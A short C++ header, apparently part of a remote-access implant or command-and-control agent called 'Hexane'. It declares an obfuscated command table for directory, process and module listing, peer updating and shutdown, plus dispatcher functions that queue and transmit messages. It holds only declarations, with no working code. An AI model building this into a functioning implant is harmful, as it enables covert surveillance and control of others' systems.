#ifndef HEXANE_CORELIB_MESSAGE_HPP
#define HEXANE_CORELIB_MESSAGE_HPP
#include <core/corelib.hpp>

_code_seg(".rdata") _command_map cmd_map[] = {
    { .name = OBF("DirectoryList"),     .address = Commands::DirectoryList },
    { .name = OBF("ProcessModules"),    .address = Commands::ProcessModules },
    { .name = OBF("ProcessList"),       .address = Commands::ProcessList },
    { .name = OBF("UpdatePeer"),        .address = Commands::UpdatePeer },
    { .name = OBF("Shutdown"),          .address = Commands::Shutdown },
    { .name = nullptr,                  .address = nullptr }
};

namespace Dispatcher {

    FUNCTION BOOL PeekPID(_stream *stream);
    FUNCTION VOID CommandDispatch (_stream *in);
    FUNCTION VOID AddMessage(_stream *out);
    FUNCTION VOID ClearQueue(void);
    FUNCTION VOID QueueSegments(byte *buffer, uint32_t length);
    FUNCTION VOID OutboundQueue(_stream *out);
    FUNCTION VOID MessageTransmit(void);
}
#endif //HEXANE_CORELIB_MESSAGE_HPP

